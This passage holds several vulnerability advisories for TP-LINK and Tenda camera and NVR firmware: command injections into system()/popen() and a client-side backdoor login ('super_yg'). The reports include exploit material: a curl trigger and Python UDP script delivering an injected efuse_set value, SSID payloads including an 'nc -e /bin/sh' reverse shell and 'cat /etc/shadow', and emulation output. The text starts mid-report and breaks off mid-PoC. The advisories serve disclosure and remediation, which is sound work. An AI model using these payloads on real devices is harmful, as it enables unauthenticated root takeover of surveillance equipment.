4. Privilege reduction: run `webfilter/time.sh` rule deployment under a low-privilege service account so management-plane injection no longer directly yields root; enable audit alerting on management-plane write operations to surface exploitation attempts.

## References

- Firmware download: <https://media.tp-link.com.cn/software/TL-FW5600E%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620260311_1.11.2.zip>

## Discoverer

Vulnerability discovered by **JiuZero**.

title: TP-LINK TL-IPC43AW 1.0.7: bin/main perf_test Command Injection (Post-File-Write, Root RCE)
content:
# TP-LINK TL-IPC43AW 1.0.7: bin/main perf_test Command Injection (Post-File-Write, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- **Vulnerability Type**: Command injection in the production-test (`perf_test`) onboarding flow of `/bin/main`, escalating a configuration-file write into root command execution

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | TP-LINK (普联技术有限公司) |
| Product | TL-IPC43AW 双摄版 IP Camera (firmware internal identity: TL-IPC4XAW DOUBLE-STREAM) |
| Model | TL-IPC43AW 双摄版 (TL-IPC4XAW DOUBLE-STREAM), hardware version 1.0 |
| Firmware filename & version | TL-IPC43AW 双摄版 V1.0升级软件20230801_1.0.7.zip — 1.0.7 Build 230801 Rel.66722n |
| Severity | High |
| Component | `/bin/main` — `perf_test` module onboarding connect call site @ 0x6d77c (sprintf→system), command format string at 0x1f7a96 |

Firmware package SHA-256: `41023babac61df8943a884817b7928686fd784bc32f3ed3d9205c5045e58d890`
Inner `.bin` SHA-256: `6c5e646ebb7e9055a52a87cc201d19181819a51f284cd0e71928e9160ea8d71f`
Binary: `/bin/main` (ARM 32-bit little-endian Thumb-2, uClibc, dynamically linked, stripped); the web service is embedded in `/bin/main` (uhttpd data model, `/www`).

## Vulnerability Description

The production-test (`perf_test`) module of `/bin/main`, when onboarding the camera onto a Wi-Fi network, reads the configuration file `/tmp/config.txt` (JSON), extracts its `ssid` and `password` fields, splices them with `sprintf` into the command `ubus call onboarding connect '{"ssid":"%s", "password":"%s"}'`, and executes the result directly with `system()`. Neither field is filtered for shell metacharacters. Any attacker who can write to `/tmp/config.txt` — for example through a writable exported volume, an SD card, or other existing injection/unauthorized write primitives — can place a payload such as `;cmd;#` in the `ssid` field and achieve arbitrary command execution as root.

## Root Cause Analysis

Analysis of `/bin/main` (per the report):

1. **Command construction site** — in the function at 0x6d77c, `json_object_object_get` fetches two strings from the JSON configuration object (0x6d790–0x6d7d2) and `json_object_get_string` yields `ssid` (r5) and `password` (r6).
2. **Format string** — at 0x6d7ee the code loads the `.rodata` string `ubus call onboarding connect '{"ssid":"%s", "password":"%s"}'` (vaddr 0x1f7a96).
3. **Dangerous calls** — `0x6d7f6 sprintf(buf, fmt, ssid, password)` followed by `0x6d80a system(buf)`. No filtering, whitelist, or blacklist function exists anywhere along the chain.
4. **Data source** — the function is called by the `perf_test` module, which loads the configuration with `json_object_from_file("/tmp/config.txt")` (0x6daa2). `/tmp/config.txt` is a production-test/debug configuration file whose content is controlled by whoever holds write access; `/tmp` on the device is writable and reachable through multiple export interfaces (SD card, cloud/network writes).
5. **Execution identity** — root. The package's audit notes also map the same binary's related sinks (e.g. `mount_disk` NAS injection at 0xa2ad8/0xa2b90 via the `system()` wrapper at 0xa4560), confirming this is one of several string-built `system()` call sites in `/bin/main`.

## Exploitation

### Preconditions

- The attacker needs a way to write `/tmp/config.txt` on the device (writable exported volume, SD card, or any other file-write primitive); the injection point itself then turns that write into root command execution.

### Steps

1. Verify the firmware package hash and unpack (`bash ./extract_firmware.sh` auto-locates the SquashFS superblock — `hsqs` @ 0x1C1200, bytes_used 6327720, xz — and produces `./extract/squashfs-root/bin/main` plus the full rootfs).
2. Confirm the device identity from `./extract/squashfs-root/etc/default/device_info/info`: `"device_model": "TL-IPC4XAW DOUBLE-STREAM"`, `"sw_version": "1.0.7 Build 230801 Rel.66722n"`.
3. Run the Unicorn single-function PoC (`python3 ./unicorn_perftest.py`, or `bash ./run_emulation.sh`), which emulates the 0x6d7ee sprintf→system call site with the SSID field injected as `mywifi;id;echo PWNED_CNVD;#`, simulating a malicious `/tmp/config.txt`:

```text
[UNICORN] perf_test onboarding command injection sink @0x6d77c (sprintf->system)
[UNICORN] Injecting SSID field: 'mywifi;id;echo PWNED_CNVD;#'
[UNICORN] Emulating call site 0x6d7ee...
[IMPORT] sprintf('ubus call onboarding connect '{"ssid":"mywifi;id;echo PWNED_CNVD;#", "password":"secret"}'')
[IMPORT] system('ubus call onboarding connect '{"ssid":"mywifi;id;echo PWNED_CNVD;#", "password":"secret"}'')
[CMD-CONSTRUCTED] ubus call onboarding connect '{"ssid":"mywifi;id;echo PWNED_CNVD;#", "password":"secret"}'
VERDICT SUCCESS: injected ssid reached system() unmodified -> command injection
```

The built shell command contains the unmodified payload inside single quotes; because the single-quoted JSON string is spliced into a `system()` shell line, the embedded `;` terminates the `ubus` invocation and executes the attacker's commands (`id`, `echo PWNED_CNVD`) as root.

## Evidence

![Firmware extraction with both SHA-256 hashes and sw_version 1.0.7 Build 230801 Rel.66722n](TLIPC43AW_images/fig1.png)

![etc/default/device_info/info proving device model TL-IPC4XAW DOUBLE-STREAM (TL-IPC43AW 双摄版) and firmware 1.0.7](TLIPC43AW_images/fig2.png)

![Unicorn PoC: injected SSID 'mywifi;id;echo PWNED_CNVD;#' passing unmodified through sprintf into system(), VERDICT SUCCESS](TLIPC43AW_images/fig3.png)

## Impact

An attacker who gains any file-write primitive on the camera (SD card content, writable export, or another injection/unauthorized-write bug) can escalate directly to arbitrary root command execution through this `perf_test` onboarding path. Root-level control of a surveillance camera implies full compromise: live audio/video access, credential and configuration theft, botnet persistence, and pivoting into the attached network.

## Remediation Suggestions

Per the report's recommendations:

1. Stop concatenating `ssid`/`password` into shell commands; switch to the structured `ubus` client API (`ubus_call`) with typed parameters, or use an `execv` argument array.
2. Apply access control to the reading and content origin of `/tmp/config.txt`, restricting writes to trusted production-test processes only.
3. If string assembly must remain, enforce a strict character whitelist on `ssid`/`password` (printable characters only, rejecting `;|&$()<>` and backticks) for both fields.
4. Audit `system`/`popen` call sites at compile/run time to prevent new concatenation paths from being introduced.

## References

- Firmware download: <https://media.tp-link.com.cn/software/TL-IPC43AW%20%E5%8F%8C%E6%91%84%E7%89%88%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620230801_1.0.7.zip>

## Discoverer

title: Tenda TC3B14C V25.4.25.15: Kylin HAL_Awss_Connect_Ap nmcli Command Injection (Pre-Auth, Root RCE)
content:
# Tenda TC3B14C V25.4.25.15: Kylin HAL_Awss_Connect_Ap nmcli Command Injection (Pre-Auth, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- **Vulnerability Type**: Command injection via attacker-controlled Wi-Fi SSID spliced into `nmcli` commands executed by `system()`

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | Tenda |
| Product | TC3B14C (NVR, Network Video Recorder) |
| Model | TC3B14C |
| Firmware filename & version | TC3B14CV1.0升级包.zip (inner `US_TC3B14CV1.0xs_V25.4.25.15_en+cn_TDC01(TDE01).bin`) — V25.4.25.15, compiled 2024-12-26 |
| Severity | Critical |
| Component | `/opt/app/bin/Kylin` — `HAL_Awss_Connect_Ap` @ 0x4e310c (source `HAL_AWSS_linux.c`, Alibaba Cloud IoT LinkKit/Smart-Living SDK AWSS hardware abstraction layer) |

Firmware SHA-256: `c9945f096a43fb3ecbee17a4ace400f7d8130ef5bced99ba63357c65e8376745`
Kylin binary SHA-256: `399ccedc56669e783982298284077b8259a483405f9d3c836e26780d271e76e9`
Architecture: ARM 32-bit (EABI5, little-endian), dynamically linked against uClibc.

## Vulnerability Description

In the `Kylin` main program of Tenda TC3B14C NVR firmware V25.4.25.15, the function `HAL_Awss_Connect_Ap` (0x4e310c, from `HAL_AWSS_linux.c`) connects to a configured Wi-Fi AP by concatenating the SSID input parameter — without any filtering or escaping — into `nmcli` system commands via `snprintf`, and executes them with `system()`. The function belongs to the hardware-abstraction layer of the Alibaba Cloud IoT SDK (LinkKit / Smart Living), handling Wi-Fi provisioning instructions from the Alibaba IoT platform (AWSS — Alibaba Wireless Setup Service). The SSID is the function's first argument (`r0` → `r5`).

The function body contains seven `snprintf` + `system()` pairs; five of them take their `%s` directly from the SSID argument, using formats such as `nmcli connection down %s`, `nmcli connection delete %s`, `nmcli connection add con-name %s type wifi ifname %s autoconnect yes ssid %s mode ap` (SSID appears twice), `nmcli connection modify %s ...`, and `nmcli connection up %s`; the remaining two use an interface-name global (`ifconfig %s down`) and a compile-time constant (`nmcli connection delete linkkit`). An attacker can craft a malicious SSID containing shell metacharacters (`;`, `|`, `$()`, backticks) and deliver it either through a provisioning command from the Alibaba IoT platform or via the local AWSS broadcast protocol, executing arbitrary commands on the device with root privileges.

## Root Cause Analysis

1. **Dangerous format strings** — located in `.rodata` at offsets 0x65a248–0x65a31f (SSID-controlled entries marked with ★):

```text
ifconfig %s down                                                      (0x5307b2, interface-name global)
nmcli connection down %s                                              (0x65a248) ★
nmcli connection delete %s                                            (0x65a269, constant "linkkit")
nmcli connection delete %s                                            (0x65a269) ★
nmcli connection add con-name %s type wifi ifname %s autoconnect yes ssid %s mode ap (0x65a284) ★ (SSID twice)
nmcli connection modify %s 802-11-wireless.mode ap ipv4.method shared (0x65a2d9) ★
nmcli connection up %s                                                (0x65a31f) ★
```

2. **Code flow** — cross-references of these strings lead to `HAL_Awss_Connect_Ap` at 0x4e310c. The first instruction `mov r5, r0` saves the SSID argument into `r5`; a 256-byte command buffer is allocated on the stack (`add r0, sp, #8`, `mov.w r1, #0x100`); the format strings are filled with `r5` (or the interface-name global `[0x6e5b38]` / the constant `linkkit`) via `snprintf` (BLX 0x1dda4) and immediately executed via `system()` (BLX 0x1dc24, PLT). This `snprintf` + `system()` pattern repeats 7 times, with 5 `system()` call sites fed by the SSID (0x4e315c / 0x4e319c / 0x4e31c2 / 0x4e31e2 / 0x4e3202):

```asm
0x4e310c: push {r4,r5,r6,r7,lr}   ; function entry
0x4e310e: mov r5, r0              ; r5 = SSID (first argument, user input)
0x4e314c: ldr r2, [pc, #offset]   ; load "nmcli connection down %s"
0x4e314e: mov r3, r5              ; r3 = SSID
0x4e3150: mov.w r1, #0x100        ; buffer size 256
0x4e3156: blx 0x1dda4             ; snprintf
0x4e315a: add r0, sp, #8          ; command buffer
0x4e315c: blx 0x1dc24             ; system() — injection sink
```

3. **SDK provenance** — `.rodata` contains the build path `.../smartliving/ali-smartliving-device-sdk-c/src/ref-impl/hal/os/ubuntu/HAL_AWSS_linux.c`, confirming the code comes from the Alibaba Smart-Living device SDK's AWSS module. The SSID arrives from external input (cloud provisioning command or local AWSS broadcast packet) and reaches `system()` unchecked.

## Exploitation

### Preconditions

- Delivery of a malicious SSID to the device's AWSS provisioning flow — either via the Alibaba IoT platform or via the local AWSS broadcast protocol. No authentication is described as required.

### Steps

Verification used two complementary function-level emulation approaches in which the firmware's own instructions build and execute the command line (per the report):

1. Verify the firmware hash (`sha256sum`, expected `c9945f09…76745`) and unpack with `bash ./extract_firmware.sh`, obtaining Kylin (SHA-256 `399ccedc…76e9`); confirm the `.bin` header shows `TC3B14C` / `V25.4.25.15`.
2. Scheme 1 — Unicorn whole-function emulation (`python3 ./poc_nmcli_emu.py`): map the real Kylin ELF segments, execute `HAL_Awss_Connect_Ap` from 0x4e310c through return, modeling only the PLT stubs (`memset/memcpy/strlen/snprintf/system`); `snprintf` is formatted strictly per AAPCS from emulated registers/stack, so every `system()` sink shows the command produced by the firmware itself. With a baseline SSID `MyHomeWiFi` the firmware builds 7 commands (e.g. `nmcli connection down MyHomeWiFi`); after switching the SSID to `AP;id>/tmp/KYLIN_CWE78_NMCLI;#`, `x$(reboot)y`, `x|nc -e /bin/sh 10.0.0.1 4444|z`, and `` x`cat /etc/shadow`y ``, the metacharacters `; | $ ( ) ` >` reach all 5 SSID-controlled `system()` sinks unfiltered.
3. Scheme 2 — QEMU + strace real-execution forensics (`python3 ./poc/patch_nmcli.py` patches Kylin into a harness: `DT_INIT_ARRAYSZ=0`, a 24-byte Thumb stub at 0x51db74, `e_entry` pointed at the stub; then `strace -f -e trace=execve qemu-arm-static -L merged_rootfs ./poc/kylin_nmcli`). The strace captures the firmware-built command line entering a real shell:

```text
execve("/bin/sh", ["/bin/sh","-c","nmcli connection down AP;id>/tmp/KYLIN_CWE78_NMCLI;#"], ...)
execve("/usr/bin/id", ["id"], ...) = 0      # injected command really fork/exec'd, once per sink (5x)
```

4. On-disk proof: `cat /tmp/KYLIN_CWE78_NMCLI` outputs `uid=0(root) gid=0(root) groups=0(root)` — the injected command ran as root. (`system()` → `execve("/bin/sh")` is carried by the host POSIX shell under qemu user-mode; the load-bearing fact is that the command string is produced entirely by the firmware's own ARM instructions, with the `;` in the SSID parsed by the shell as a command separator.)

## Evidence

![Firmware SHA-256 verification, ZIP extraction of the V25.4.25.15 image, and binwalk start](TendaTC3B14C_images/fig1.png)

![.bin header hexdump proving device identity TC3B14C and version V25.4.25.1(5)](TendaTC3B14C_images/fig2.png)

![Unicorn function-level emulation: baseline 7 commands, semicolon and $() payloads reaching 5/7 system() sinks unfiltered](TendaTC3B14C_images/fig3.png)

![Reverse-shell and backtick payloads at all 5 sinks, plus QEMU strace execve capture and uid=0(root) on-disk proof](TendaTC3B14C_images/fig4.png)

## Impact

An attacker who can deliver a crafted SSID through the AWSS provisioning path executes arbitrary commands with root privileges on the NVR. Root access permits complete compromise of the recorder: stored-video theft or destruction, credential harvesting, firmware tampering, and reverse shells back to the attacker (demonstrated in-package with `x|nc -e /bin/sh …|z` and `` `cat /etc/shadow` `` payloads).

## Remediation Suggestions

Per the report's recommendations:

1. Input filtering and escaping: strictly filter all SSID and connection-name parameters passed to `HAL_Awss_Connect_Ap`; remove or escape shell metacharacters (`; | & $ \ ` ( ) { } < > \n` etc.) and allow only letters, digits, spaces, hyphens and underscores.
2. Safe execution: replace the `snprintf` + `system()` pattern with the `execve()` family passing an argument array (e.g. `execvp("nmcli", argv[])`) instead of string concatenation.
3. Use the NetworkManager D-Bus API (e.g. the `libnm` library) instead of the `nmcli` command-line tool for network configuration, avoiding external commands through a shell.
4. Least privilege: `Kylin` should not run as root; run the main program under a dedicated low-privilege user and elevate only specific network-configuration operations via capabilities (e.g. `CAP_NET_ADMIN`) or sudo rules.
5. SSID length and charset validation: per IEEE 802.11 an SSID is at most 32 bytes — validate length and restrict to printable ASCII or valid UTF-8 when receiving AWSS provisioning parameters.

## References

- Firmware download (official vendor link found in the package): `https://static.tenda.com.cn/doc/2025/01/13/b63a428f38dd468da1b7ddd9cf055a83/TC3B14CV1.0%E5%8D%87%E7%BA%A7%E5%8C%85.zip` — analyzed image `TC3B14CV1.0升级包.zip` (SHA-256 `c9945f096a43fb3ecbee17a4ace400f7d8130ef5bced99ba63357c65e8376745`)

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda RP3 V31.1.10.91: Kylin ATE_SetCmd Command Injection (Pre-Auth, Root RCE)
content:
# Tenda RP3 V31.1.10.91: Kylin ATE_SetCmd Command Injection (Pre-Auth, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- **Vulnerability Type**: Unauthenticated command injection in the ATE (Automatic Test Equipment) production-test module of the `Kylin` main program

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | Tenda (深圳市吉祥腾达科技有限公司) |
| Product | RP3 IPC (IP camera) |
| Model | RP3 (hardware version V3.0, chip AK39EV300L / AC_39, sensor GC2083) |
| Firmware filename & version | US_RP3V3.0ac_V31.1.10.91_en+cn_TDC01(TDE01).bin (inside RP3V3.0升级包.zip) — SWVersion V31.1.10.91, build 2025-03-31 |
| Severity | Critical |
| Component | `/opt/app/bin/Kylin` — `ATE_SetCmd` (VA 0xda858), reached via `CAte::HandleCmd` (VA 0xddbe4) |

Firmware package (`RP3V3.0升级包.zip`) SHA-256: `eed49f825c7fb187be0a55627c7f0a6f3927913f13dbb38554727e11ffccd4d3`
Architecture: ARM 32-bit LE, uClibc 1.0.31; `Kylin` is a 9,528,772-byte ELF 32-bit LSB ARM binary (stripped).

## Vulnerability Description

The `Kylin` main program embeds an ATE production-line auto-test module. It is armed in two steps, both reconstructed statically from the binary:

1. **HTTP trigger of initialization**: the `/goform/ate` HTTP endpoint (route matched by `strstr(path, "/goform/ate")`) is handled by `soap_redirect_production_test` (VA 0x1b2cc8), which does **not parse the request body** — it only performs singleton initialization, calls `CAte::Start` (VA 0xddad8) to spawn the `CAte::ThreadProc` (VA 0xe7b88) worker thread, and returns `load_mfg_success` / `load_mfg_error`.
2. **UDP JSON command channel**: `CAte::ThreadProc` creates `socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)`, sets `SO_REUSEADDR` and `SO_BINDTODEVICE("wlan0")`, and binds `0.0.0.0:7329`; it then loops on `select → recvfrom(fd, buf, 2048, 0, &cliaddr)` and hands each datagram to `CAte::HandleCmd` (VA 0xddbe4). Requests are JSON: `{"method":"<PT…>", "param":{…}}`; responses are sent back with `sendto` as `{"result":"success"|"failure"}`.

`CAte::HandleCmd` dispatches on `root["method"]` (PTMpStart, PTGetMapFile, PTMpTher, **PTEfuseSet**, PTRfTxCali, PTRfRxCali, PTMpTxStop, PTMpQuery, PTMpStop, ThroughputTest, image_set_day_night_cut_test). The **PTEfuseSet** branch reads `param.efuse_set`; whenever the value differs from the whitelist string `"wlfk2map"` it executes:

```c
snprintf(cmd, 128, "rtwpriv wlan0 efuse_set %s > /var/ate.log", efuse_set);  // VA 0xe31b4
ATE_SetCmd(cmd);                                                             // VA 0xe31cc
```

`ATE_SetCmd` (VA 0xda858) passes the command string straight to `popen()` as its first argument — no character filtering, no shell-metacharacter escaping, no command whitelist, no input length limit (the `snprintf` only truncates the whole line to 128 bytes). An attacker can inject shell metacharacters (`;`, `|`, backticks, `$`) in `efuse_set` to append arbitrary system commands. No `digest_authentication` or other authentication check exists anywhere on the ATE path, making this an unauthenticated remote command execution; `Kylin` runs as root, so successful exploitation yields full root control. Note the UDP socket is bound to `wlan0` via `SO_BINDTODEVICE`, so the payload must be reachable through the device's wlan0 address.

## Root Cause Analysis

Vulnerable function `ATE_SetCmd @ VA 0xda858` (source file `Ate.cpp`, per debug strings):

```asm
da858: push {r4, r5, lr}
da85c: mov  r1, r0          ; r1 = cmd string (for printf)
da860: sub  sp, sp, #140
da864: mov  r4, r0          ; r4 = cmd string (save)
da868: ldr  r0, ="ATE_SetCmd cmd %s\n"
da86c: bl   printf@plt      ; 0x1a2b0
da870: ldr  r1, ="r"
da874: mov  r0, r4          ; r0 = raw user input, NO filtering
da878: bl   popen@plt       ; 0x195b4 executes user input directly!
da8a8: bl   pclose          ; 0x19e9c waits for command completion
da8cc: ldr  r0, ="/var/ate.log"
da8d0: bl   access@plt      ; 0x19d94 checks the file -> decides success/failure
```

Full two-stage call chain (per the 2026-10-24 static-reconstruction correction; earlier notes saying "HTTP POST reaches HandleCmd directly" and `HandleCmd=0xdad80` were inaccurate):

```text
[Stage 1: init trigger]
HTTP any-method /goform/ate (body not parsed)  (strstr route, VA 0x398ea0)
→ soap_redirect_production_test (VA 0x1b2cc8) → CAte::Start (VA 0xddad8) → CAte::ThreadProc (VA 0xe7b88)

[Stage 2: command channel]
socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP) + setsockopt(SO_REUSEADDR)
+ setsockopt(SO_BINDTODEVICE,"wlan0") (optname 25, optlen 5) + bind(0.0.0.0:7329)   (call site VA 0xe847c)
→ select → recvfrom(fd, buf, 2048, 0, &cliaddr)  (PLT 0x19d28 @ 0xe85a0)
→ CAte::HandleCmd(this, buf, len, &cliaddr)      (VA 0xddbe4)
→ root["method"]=="PTEfuseSet" && param.efuse_set != "wlfk2map"   (strcmp-semantics compare, VA 0xa8a44)
→ snprintf(cmd, 128, "rtwpriv wlan0 efuse_set %s > /var/ate.log") (VA 0xe31b4)
→ ATE_SetCmd(cmd)  (0xe31cc → 0xda858) → popen(cmd, "r") @ PLT 0x195b4
→ pclose (wait) → access("/var/ate.log") → sendto({"result":…})   (PLT 0x19d10)
```

Supporting audit facts: `popen@plt` = 0x195b4, `system@plt` = 0x1974c are both imported; three callers of `ATE_SetCmd` exist (0xdc5c0 `CAte::SetMac`, 0xe18cc hardcoded-command branch, 0xe31cc the PTEfuseSet injection branch); the ONVIF interfaces all have explicit `digest_authentication` error handling while the ATE UDP channel has none; the response `"result":"success"` actually confirms `pclose` waited for the whole injected command line to complete and `/var/ate.log` was written.

## Exploitation

### Preconditions

- Network reachability of the device's HTTP service (to trigger `/goform/ate`) and, once armed, of UDP/7329 **on the device's wlan0 address** (the socket is `SO_BINDTODEVICE("wlan0")`; devices behind NAT on the wired side are typically unreachable from the internet).
- No authentication of any kind is required.
- Payload budget: a single UDP datagram (<= 2048 bytes), with a net injected-string length of about 88 characters (the fixed `rtwpriv wlan0 efuse_set … > /var/ate.log` prefix/suffix consumes 39 of the 128-byte `snprintf` buffer).

### Steps

1. Trigger ATE initialization (any HTTP method works; the body is not parsed):

```bash
curl -s -X POST http://<target>/goform/ate
```

2. Send the UDP JSON payload:

```python
import socket, json
payload = {"method": "PTEfuseSet",
           "param": {"efuse_set": "id;echo PWNED;#"}}
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(json.dumps(payload).encode(), ("<target>", 7329))
print(s.recvfrom(2048)[0].decode())   # {"result":"success"}
```

The device then executes as root: `rtwpriv wlan0 efuse_set id;echo PWNED;# > /var/ate.log` — the injected `id` and `echo PWNED` run with root privileges. A `{"result":"success"}` reply proves `pclose` waited for the entire command line, injected part included.

3. Sink-level verification (Unicorn single-function emulation, `unicorn_ate_harness.py`): the harness maps the real `Kylin` ELF (LOAD base 0x10000) into a Unicorn ARM emulator, hooks `popen@plt` (0x195b4) and `printf@plt`, and executes `ATE_SetCmd` from 0xda858 with test payloads. Captured output:

```text
[INPUT] rtwpriv wlan0;id;#
  [IMPORT] popen("rtwpriv wlan0;id;#", "r")
  [VULN] Metacharacter ';' in popen argument!
  VERDICT: SUCCESS

[INPUT] rtwpriv wlan0;cat /etc/passwd;#
  [IMPORT] popen("rtwpriv wlan0;cat /etc/passwd;#", "r")
  [VULN] Metacharacter ';' in popen argument!
  VERDICT: SUCCESS

[INPUT] $(whoami)
  [IMPORT] popen("$(whoami)", "r")
  [VULN] Metacharacter '$' in popen argument!
  VERDICT: SUCCESS

VERDICT SUCCESS: Command injection CONFIRMED in ATE_SetCmd
```

Semicolons, `$(...)` and other metacharacters pass through to `popen()` unfiltered (a benign payload `rtwpriv wlan0 efuse_set wlwfake,0xb8,23 > /var/ate.log` was captured as `VERDICT: NORMAL`, confirming the harness exercises the normal path too). The qemu-user level-2 boot additionally proved the firmware loads: `Application Version 4.1.2`, `productName RP3V3.0`, `swVersion V31.1.10.91`, `<Ate.cpp:772>:CAte::CAte start`.

## Evidence

The delivery package for this finding contains no screenshots; the evidence is textual, from the recorded transcripts:

- `version-info.transcript` — device-identity proof: `custom_root/version` shows `SWVersion=V31.1.10.91`, `DeviceType=RP3`, `HWVersion=V3.0`, `ChipType=AC_39`, `CustomerId=TDC01`, plus the Kylin banner `hwVersion V3.0 swVersion V31.1.10.91`.
- `emulation-boot.transcript` — qemu-arm-static boot log of `Kylin`, showing `Application Version 4.1.2` and the ATE module starting (`<Ate.cpp:772>:CAte::CAte start`), proving the target firmware loads under emulation.
- `poc-cmdi-ate-1.transcript` — Unicorn harness capture of `popen("rtwpriv wlan0;id;#", "r")`, `popen("rtwpriv wlan0;cat /etc/passwd;#", "r")` and `popen("$(whoami)", "r")`, each flagged `[VULN] Metacharacter … in popen argument!`, ending in `VERDICT SUCCESS: Command injection CONFIRMED in ATE_SetCmd`.

## Impact

An unauthenticated attacker who can reach the device over HTTP and wlan0 UDP can execute arbitrary commands with root privileges on the camera, limited only by the ~88-character payload budget per datagram. Root-level execution enables full device compromise: live-stream and credential theft, firmware replacement, and inclusion of the camera in a botnet. The `success` response even acts as a command-completion oracle.

## Remediation Suggestions

Per the report's recommendations:

1. Preferred: remove the `/goform/ate` endpoint and all ATE test code from production firmware; use a separate test-only firmware image on the production line.
2. If ATE must remain: add strong authentication (per-device ATE token or certificate) so the channel is reachable only in factory environments.
3. Enforce a strict whitelist on `ATE_SetCmd` command parameters — only predefined `rtwpriv`/`fw_printenv` test commands — rejecting any input containing shell metacharacters.
4. Replace `popen()` with shell-free system calls such as `execvp()` to eliminate command injection at the root.
5. Add runtime checks for production-test mode (e.g. GPIO strap state or a flag file) and disable all ATE functionality outside the factory environment.

## References

- The delivery package does not include an external firmware download URL; the analyzed image is `US_RP3V3.0ac_V31.1.10.91_en+cn_TDC01(TDE01).bin` from `RP3V3.0升级包.zip` (SHA-256 `eed49f825c7fb187be0a55627c7f0a6f3927913f13dbb38554727e11ffccd4d3`).

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda IC7-PRS 2209020910: login.js super_yg Backdoor Account (Pre-Auth, Login Bypass and Credential Recovery)
content:
# Tenda IC7-PRS 2209020910: login.js super_yg Backdoor Account (Pre-Auth, Login Bypass and Credential Recovery)

## Vulnerability Type / CWE

- **CWE-603**: Use of Client-Side Authentication; additionally **CWE-489** (Active Debug Code / hardcoded branch) and reversible (Base64) storage of credentials
- **Vulnerability Type**: Authentication bypass through a hardcoded client-side backdoor account (`super_yg`), plus reversible Base64 encoding of username:password in cookies

## Affected Product

| Item | Detail |
| --- | --- |
| Vendor | TENDA (sysinfo/brand = TENDA) |
| Product | IC7-L(P)RS IP Camera (hw_name, model, device_type, hw_id all `IC7-L(P)RS`; upgrade package `IC7-PRS升级软件.zip`) |
| Model | IC7-L(P)RS (SoC FH8852V2X0, WiFi RTL8188FU, sensor gc4653_mipi@td, board_id board_1250) |
| Firmware filename & version | IC7-PRS升级软件.zip — firmware_version 2209020910, fw_revision 2, build 2022-09-02T09:10, kernel Linux-4.9.129 |
| Severity | Medium |
| Component | `/app/www/doc/script/login.js` (`DoLogin()`); supporting: `/app/www/doc/script/common.js` (`checkIsDisabledSaveBtn()`, `webPlayerPlay()`) |

Firmware SHA-256: `22351305a802fcb980e92afe65abfcd6fe1202fdba4f9c2a16f8160585360d38`
MD5: `f54982f054975024052aec738d5ad85c` (inner `Flash.img` MD5: `868d995d150b523c345d130436f2bd8e`)

## Vulnerability Description

The device's web front end `login.js` contains a hardcoded backdoor branch inside `DoLogin()`:

```js
m_szUserPwdValue=Base64.encode($("#UserName").val()+":"+$("#Password").val());
g_oWebSession.setItem("userInfo",m_szUserPwdValue);
if($("#UserName").val()=="super_yg"){jumpPage();return}
```

By simply entering the username `super_yg` in the login form, the function jumps straight to the main page before any authentication request is sent to the server's `/PSIA/YG/userCheck` endpoint (the reproduction measured zero `userCheck` requests reaching the server, with `window.location.href` set to `main.html?_V1`). The authentication decision is made entirely by front-end code. `common.js`'s `checkIsDisabledSaveBtn()` additionally treats the same username as a high-privilege account, skipping the `/PSIA/YG/UserPermission` permission query.

Alongside the backdoor branch, `DoLogin()` stores `username:password` reversibly Base64-encoded in `curUserInfo` (valid 365 days when auto-login is checked) and in `cur_UserInfo` / `cur_userName` cookies; `common.js`'s `webPlayerPlay()` then concatenates the decoded pair directly into an RTSP stream URL (`rtsp://<user>:<pwd>@<host>:8554/profile0`). A login-bypass attacker can view the main and configuration pages and can recover the administrator password from cookies; once recovered, the password works on all PSIA/RTSP/ONVIF interfaces. (The server component `apollo` contains no `super_yg` user, so later PSIA calls remain server-checked — the direct impact is the front-end login bypass and credential recovery, which is why the report rates it medium.)

## Root Cause Analysis

1. **Entry point**: `DoLogin()` in `/app/www/doc/script/login.js` is the only handler for the login button and the Enter key (`InitLogin()` binds `document.onkeydown`, `loginEventBind()` binds the body `keydown`) — no preconditions.
2. **User input**: `$("#UserName").val()` and `$("#Password").val()` come straight from the login form. Only `JudgeTextLength()` (username <= 15, password <= 16 bytes) and `isChinese()` (rejects non-ASCII usernames) apply; neither relates to the authentication decision.
3. **Dangerous branch**: after Base64-encoding the credential pair into session storage, the code runs `if($("#UserName").val()=="super_yg"){jumpPage();return}` — the `return` occurs **before** the server-side `$.ajax({url: .../PSIA/YG/userCheck, data: "userName="+...&password=CryptoJS.MD5(...)})`, i.e. a front-end hardcoded authentication bypass.
4. **Why filtering is absent**: the check is an equality match that *grants* access to a specific username rather than restricting it — a blacklist-style logic error that cannot be hardened into a stronger check. `checkIsDisabledSaveBtn(UserName)` sets `isDisabledSaveBtn=false` for the same username and returns early, skipping `/PSIA/YG/UserPermission`.
5. **Password leakage chain**: on success the code writes `$.cookie("cur_UserInfo", Base64.encode(user+":"+pass))`, `$.cookie("cur_userName", Base64.encode(user))`, and with auto-login `$.cookie("curUserInfo", ..., {expires:365})`. `webPlayerPlay()` reads `cur_UserInfo`, Base64-decodes it, and builds `rtsp://<user>:<pwd>@<host>:8554/profile0`. The login request itself hashes the password with unsalted, non-iterated MD5, recoverable offline.

## Exploitation

### Preconditions

- Network reachability of the device's web interface; any visitor of the login page can trigger the branch. No credentials required (`super_yg` + any password).

### Steps

The PoC (`poc_login_backdoor.js`) loads the genuine firmware `login.js` (extracted via `bash ./extract_firmware.sh`, verified `SHA-256 22351305…0d38`) in Node's `vm` runtime, wiring `$.ajax` to a real HTTP "mock device PSIA server" on a random local port that accepts only `admin/Admin@123`. Three cases were compared:

1. Case A — backdoor: username `super_yg`, password `Anything_123`:

```text
[SERVER-RECORD] /PSIA/YG/userCheck requests = 0 (none)
